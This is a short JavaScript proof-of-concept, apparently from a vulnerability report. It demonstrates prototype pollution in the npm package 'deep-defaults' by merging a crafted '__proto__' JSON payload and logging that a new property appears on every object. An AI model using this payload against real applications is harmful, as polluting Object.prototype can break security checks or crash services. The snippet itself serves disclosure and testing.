var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
var deepDefaults = require('deep-defaults');
var malicious_payload = '{"__proto__":{"polluted":"yes"}}';
var obj = {};
console.log({}.polluted);
deepDefaults(obj, JSON.parse(malicious_payload));
console.log({}.polluted);